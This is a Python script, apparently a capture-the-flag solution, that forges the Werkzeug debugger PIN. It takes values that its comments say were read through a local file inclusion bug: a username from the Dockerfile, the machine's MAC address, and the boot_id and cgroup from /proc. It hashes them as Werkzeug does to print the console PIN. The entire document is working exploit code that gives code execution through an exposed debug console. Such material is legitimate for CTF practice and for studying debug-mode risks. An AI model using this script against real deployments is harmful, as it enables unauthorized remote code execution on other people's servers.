# Relatively standard python debug challenge. Read the files using LFI. The Dockerfile contains the username.
# Also, the Dockerfile runs python3.11, so we can located the directory app.py is in.

import hashlib
from itertools import chain
probably_public_bits = [
    'very_secure_username',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '7177113011094',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '90eca5f1-105b-434e-ad02-135111eb1526'  # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)